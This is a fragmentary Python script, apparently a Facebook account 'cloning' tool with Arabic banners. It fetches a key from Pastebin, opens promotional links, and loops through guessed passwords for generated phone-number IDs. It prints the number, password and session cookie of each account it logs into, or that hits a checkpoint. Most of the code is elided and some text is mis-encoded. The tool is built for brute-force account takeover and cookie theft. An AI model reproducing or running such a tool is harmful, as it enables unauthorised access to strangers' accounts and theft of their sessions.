...
os.system('https://www.facebook.com/profile.php?id=100074423508403')
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/NAjZzWr9").text
...
print('تم تفعيل كود من قبل مطور البوره😁')
...
def linex():
    ...
    print(f'\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑ Qusai\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
...
def xyz():
    ...
    os.system("xdg-open https://github.com/MarwanManogi/VIP1");print(logo)

    print('           \x1b[97m[\033[37;41m ﻩﺭﻮﺒﻟﺍﺕﺍﺩﺍ ﻲﻓ ﺕﺭﻮﻧ \033[0;m] ')
    ...
    if USMAN in ["1","1"]:
        ...
        os.system("xdg-open https://facebook.com/groups/550928699368927/")
...
def Random():
    ...
    print(f"          \x1b[97m[\033[37;41m ﻪﻟﻭﺩ ﺩﻮﻛ ﺭﺎﺘﺧﺍ   \033[0;m]")
    ...
    print(f"          \x1b[97m[\033[37;41m   ﺪﻴﺻ ﻢﻗﺭ ﺭﺎﺘﺧﺍ  \033[0;m]")

    print(f"")

    limit = int(input(' EXAMPLE: 1000, 3000, 5000, 50000,  10000\n\n PUT CLONING LIMIT: '))
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[QusaiI-OKحضك حلو😁]●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nNUMBER : '+uid+'\nPASSWORD   : '+cid+' Ã¢Ë†Å¡ '+ps+ '\nCOOKIE   : '+coki+'\n●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
                ...
                print(f'\r\033[1;31m [Qusai-CPالله غالب😔] \nNUMBER : '+uid+'\nPASSWORD   : '+ps+ '\n------------------------------------')
        ...
        sys.stdout.write(f'\r\33[1;37m[A L I] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))),
